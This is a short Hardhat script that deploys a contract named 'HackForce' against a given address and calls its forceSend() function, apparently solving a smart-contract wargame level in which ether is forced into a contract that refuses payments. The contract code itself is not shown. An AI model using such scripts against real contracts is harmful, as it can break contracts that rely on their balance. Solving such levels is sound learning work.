const main = async () => {
  const hackForceFactory = await hre.ethers.getContractFactory("HackForce"),
  hackForce = await hackForceFactory.deploy('0x2A6Aec7F39856Efc74544a53601d228Eb5c43698');
  await hackForce.deployed();
  console.log("Contract deployed to: " + hackForce.address);

  let txn = await hackForce.forceSend();
  await txn.wait();
  console.log(`Ether successfully sent.`)
}


const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
};

runMain();
